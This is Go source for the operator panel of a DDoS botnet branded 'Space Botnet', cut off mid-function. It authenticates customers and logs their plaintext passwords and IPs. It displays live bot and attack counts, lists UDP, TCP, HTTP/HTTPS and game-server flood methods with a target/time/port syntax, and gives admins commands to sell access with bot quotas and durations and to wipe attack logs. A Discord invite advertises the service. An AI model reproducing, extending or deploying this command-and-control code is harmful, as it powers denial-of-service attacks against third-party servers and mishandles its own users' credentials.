package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Botnet || Please enter your credentials.\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;75mUsername \033[1;37m> \x1b[38;5;99m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;75mPassword \033[1;37m> \x1b[38;5;99m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		msg := fmt.Sprintf("\x1b[38;5;99mLoading... %c\033[0m\r", spinBuf[i%len(spinBuf)])
		this.conn.Write([]byte(msg))
		time.Sleep(100 * time.Millisecond)
	}
	this.conn.Write([]byte("\033[K\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\x1b[38;5;99mWrong user or password, try again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		usernameFormat := "username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\n\x1b[38;5;99m"))
	this.conn.Write([]byte("\x1b[38;5;99m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⠀⢠⢀⡐⢄⢢⡐⢢⢁⠂⠄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⡄⣌⠰⣘⣆⢧⡜⣮⣱⣎⠷⣌⡞⣌⡒⠤⣈⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⢀⠢⠱⡜⣞⣳⠝⣘⣭⣼⣾⣷⣶⣶⣮⣬⣥⣙⠲⢡⢂⠡⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⢀⠢⣑⢣⠝⣪⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣻⢦⣍⠢⢅⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢆⡱⠌⣡⢞⣵⣿⣿⣿⠿⠛⠛⠉⠉⠛⠛⠿⢷⣽⣻⣦⣎⢳⣌⠆⡱⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⠠⠌⢢⢃⡾⣱⣿⢿⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣏⠻⣷⣬⡳⣤⡂⠜⢠⡀⣀⠀⠀⡀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⠂⣌⢃⡾⢡⣿⢣⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⡊⣿⣿⣾⣽⣛⠶⣶⣬⣭⣥⣙⢷⣶⠦⡤⢀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⠂⠰⡌⡼⠡⣼⢃⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⠿⣛⣯⡴⢏⠳⠁⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠠⠑⡌⠀⣉⣾⣩⣼⣿⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣿⣿⣿⣿⡿⢛⣛⣯⣭⠶⣞⠻⣉⠒⠀⠂⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⢀⣀⡶⢝⣢⣾⣿⣼⣿⣿⣿⣿⣿⣀⣼⣀⣀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⠿⡛⠏⠍⠂⠁⢠⠁⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠠⢀⢥⣰⣾⣿⣯⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣽⠟⣿⠐⠨⠑⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m           ⡐⢢⣟⣾⣿⣿⣟⣛⣿⣿⣿⣿⢿⣝⠻⠿⢿⣯⣛⢿⣿⣿⣿⡛⠻⠿⣛⠻⠛⡛⠩⢁⣴⡾⢃⣾⠇⢀⠡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m           ⠈⠁⠊⠙⠉⠩⠌⠉⠢⠉⠐⠈⠂⠈⠁⠉⠂⠐⠉⣻⣷⣭⠛⠿⣶⣦⣤⣤⣤⣴⡾⠟⣫⣾⣿⡏⠀⠂⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⢿⢶⣤⣬⣉⣉⣭⣤⣴⣿⣿⡿⠃⠄⡈⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠘⢊⠳⠭⡽⣿⠿⠿⠟⠛⠉⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
	this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⠈⠐⠀⠘⠀⠈⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))

	go func() {
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			onlineCount, err := database.GetOnlineCount()
			if err != nil {
				fmt.Println("Error fetching online count:", err)
				onlineCount = 0
			}

			if userInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Space Botnet || Planets : %d | Slot : %d/1  | Total sents : %d | users : %d/%d | Login : %s \007", BotCount, database.fetchRunningAttacks(), database.fetchAttacks(), onlineCount, database.fetchUsers(), username))); err != nil {
					this.conn.Close()
					break
				}
			}
			if userInfo.admin == 0 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Space Botnet || Planets : %d | Slot : %d/1 | Login : %s\007", BotCount, database.fetchRunningAttacks(), username))); err != nil {
					this.conn.Close()
					break
				}
			}

		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[38;5;99m" + username + " \x1b[38;5;91m★ Space \033[0m\x1b[38;5;99m★ "))
		cmd, err := this.ReadLine(false)
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n\x1b[38;5;99m"))
			this.conn.Write([]byte("\x1b[38;5;99m    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⠀⢠⢀⡐⢄⢢⡐⢢⢁⠂⠄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⣌⠰⣘⣆⢧⡜⣮⣱⣎⠷⣌⡞⣌⡒⠤⣈⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢀⠢⠱⡜⣞⣳⠝⣘⣭⣼⣾⣷⣶⣶⣮⣬⣥⣙⠲⢡⢂⠡⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⢀⠢⣑⢣⠝⣪⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣻⢦⣍⠢⢅⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢆⡱⠌⣡⢞⣵⣿⣿⣿⠿⠛⠛⠉⠉⠛⠛⠿⢷⣽⣻⣦⣎⢳⣌⠆⡱⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⠠⠌⢢⢃⡾⣱⣿⢿⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣏⠻⣷⣬⡳⣤⡂⠜⢠⡀⣀⠀⠀⡀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⠂⣌⢃⡾⢡⣿⢣⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⡊⣿⣿⣾⣽⣛⠶⣶⣬⣭⣥⣙⢷⣶⠦⡤⢀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⠂⠰⡌⡼⠡⣼⢃⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⠿⣛⣯⡴⢏⠳⠁⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠠⠑⡌⠀⣉⣾⣩⣼⣿⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣿⣿⣿⣿⡿⢛⣛⣯⣭⠶⣞⠻⣉⠒⠀⠂⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⢀⣀⡶⢝⣢⣾⣿⣼⣿⣿⣿⣿⣿⣀⣼⣀⣀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⠿⡛⠏⠍⠂⠁⢠⠁⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m           ⠀⠠⢀⢥⣰⣾⣿⣯⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣽⠟⣿⠐⠨⠑⡀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m           ⡐⢢⣟⣾⣿⣿⣟⣛⣿⣿⣿⣿⢿⣝⠻⠿⢿⣯⣛⢿⣿⣿⣿⡛⠻⠿⣛⠻⠛⡛⠩⢁⣴⡾⢃⣾⠇⢀⠡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m           ⠈⠁⠊⠙⠉⠩⠌⠉⠢⠉⠐⠈⠂⠈⠁⠉⠂⠐⠉⣻⣷⣭⠛⠿⣶⣦⣤⣤⣤⣴⡾⠟⣫⣾⣿⡏⠀⠂⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⢿⢶⣤⣬⣉⣉⣭⣤⣴⣿⣿⡿⠃⠄⡈⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠘⢊⠳⠭⡽⣿⠿⠿⠟⠛⠉⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⠈⠐⠀⠘⠀⠈⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                      ╔═╗╔═╗╔═╗╔═╗╔═╗  ╔╗ ╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                      ╚═╗╠═╝╠═╣║  ║╣   ╠╩╗║ ║ ║ ║║║║╣  ║ \r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                      ╚═╝╩  ╩ ╩╚═╝╚═╝  ╚═╝╚═╝ ╩ ╝╚╝╚═╝ ╩ \r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m                 ╠═════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                     Dc group : https://discord.gg/JMr4gME9      \r\n"))
			this.conn.Write([]byte("\x1b[38;5;91m                            Discord : try999_9_72691              \r\n"))
			continue
		}
		if cmd == "Methods" || cmd == "METHODS" || cmd == "methods" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m                             \x1b[38;5;91m╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗ \x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m╔═══════════════════════════ \x1b[38;5;91m║║║║╣  ║ ╠═╣║ ║ ║║╚═╗ \x1b[38;5;99m════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║                            \x1b[38;5;91m╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝ \x1b[38;5;99m                            ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║                                                                              ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   udp-strong    \x1b[38;5;27mSpecifically optimized higher Gbps                           \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   hex-flood     \x1b[38;5;27mSpecifically optimized higher Size Payload                   \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   strong-hex    \x1b[38;5;27mSpecifically optimized higher Gbps and Bypass Servers        \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   nudp          \x1b[38;5;27mSpecifically optimized higher PPS                            \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   udphex        \x1b[38;5;27mProtocol UDP Specifically optimized higher Size Payload      \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   socket-raw    \x1b[38;5;27mSpecifically optimized higher PPS and Gbps                   \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   samp          \x1b[38;5;27mSpecifically optimized higher PING GAME                      \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   tcp-mix       \x1b[38;5;27mMIX options urg,ack,syn optimized for Bypass Servers         \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   http          \x1b[38;5;27mSimple http flood optimized for higher requests              \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   https         \x1b[38;5;27mSimple https flood optimized for higher requests             \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║                                                                              ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║\x1b[38;5;99m   Example!      \x1b[38;5;27m<Method> <Target> <Time> port=<Port>                         \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m║                                                                              ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m╚══════════════════════════════════════════════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "help" || cmd == "HELP" || cmd == "?" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m                \x1b[38;5;91m╦ ╦╔═╗╦  ╔═╗\x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ╔═════════════ \x1b[38;5;91m╠═╣║╣ ║  ╠═╝\x1b[38;5;99m ═════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║              \x1b[38;5;91m╩ ╩╚═╝╩═╝╩  \x1b[38;5;99m              ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║                                        ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m   Methods      \x1b[38;5;27mList of methods         \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m   Info         \x1b[38;5;27mUr information          \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m   Rules        \x1b[38;5;27mDon't play with rules   \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m   Pass         \x1b[38;5;27mChange your password    \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m   Clear                                \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m   Logout                               \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║                                        ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ╚════════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "pass" || cmd == "Pass" || cmd == "PASS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;27mNew password \033[1;37m> \x1b[38;5;99m"))
			newPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[38;5;99mConfirm? (y/n) \x1b[38;5;99m"))
			confirmation, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirmation != "y" && confirmation != "Y" {
				this.conn.Write([]byte("\x1b[38;5;27mPassword change canceled\r\n"))
				continue
			} else {
				username := userInfo.username
				success := database.ChangePass(username, newPassword)
				if success {
					this.conn.Write([]byte("\x1b[38;5;27mPassword successfully changed\r\n"))
				} else {
					this.conn.Write([]byte("\x1b[38;5;99mFailed to change password\r\n"))
				}
				continue
			}
		}
		if err != nil || cmd == "ongoing" || cmd == "Ongoing" {

		}
		if err != nil || cmd == "RULES" || cmd == "rules" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m             \x1b[38;5;91m╦═╗╦ ╦╦  ╔═╗╔═╗\x1b[38;5;99m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ╔══════════ \x1b[38;5;91m╠╦╝║ ║║  ║╣ ╚═╗\x1b[38;5;99m ══════════╗ \r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║           \x1b[38;5;91m╩╚═╚═╝╩═╝╚═╝╚═╝\x1b[38;5;99m           ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;99m                                     \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;27m  DO NOT SPAM ATTACKS !              \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;27m  DO NOT SHARE LOGINS !(IP is logged)\x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;27m  DO NOT ATTACK GOVERNMENTS !        \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;27m  ONLY USE FOR Testing               \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║\x1b[38;5;27m  3 Warnings = Ban                   \x1b[38;5;99m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ║                                     ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99m ╚═════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "logout" || cmd == "LOGOUT" || cmd == "exit" || cmd == "quit" {
			database.Logout(username)
			fmt.Printf("User %s has been logged out\n", username)
			return
		}

		if userInfo.admin == 1 && cmd == "hsjahelp" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[38;5;99mhsjauser      \x1b[1;33m-  \x1b[38;5;91mADD NEW NORMAL USER\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99mhsjaadmin     \x1b[1;33m-  \x1b[38;5;91mADD NEW ADMIN\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99mhsjaremove    \x1b[1;33m-  \x1b[38;5;91mREMOVE USER\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99mhsjalogs      \x1b[1;33m-  \x1b[38;5;91mREMOVE ATTACKS LOGS\r\n"))
			this.conn.Write([]byte("\x1b[38;5;99mcount         \x1b[1;33m-  \x1b[38;5;91mSHOW ALL BOTS\r\n"))

			continue
		}

		if err != nil || cmd == "INFO" || cmd == "Info" || cmd == "info" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m ═════════════════════════════════  \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m  \x1b[38;5;99m    Logged In As: \x1b[38;5;27m" + username + "          \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m  \x1b[38;5;99m    Developed By \x1b[38;5;27mTry999_9                   \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m ═════════════════════════════════  \r\n")))
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "hsjaadmin" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm(y): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create Admin! \r\n"))
			} else {
				this.conn.Write([]byte("Admin created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "hsjalogs" {
			this.conn.Write([]byte("\x1b[38;5;99mClear attack logs\x1b[38;5;99m?(y/n): \x1b[38;5;99m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
			} else {
				this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\x1b[38;5;99m[\033[1;92mServerLogs\x1b[38;5;99m] Logs has been cleaned by \033[1;92m" + username + " \x1b[38;5;99m!\r\n")
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "hsjaremove" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "hsjauser" {
			this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m Enter New Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m Choose New Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m Enter Bot Count (-1 For Full Bots): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
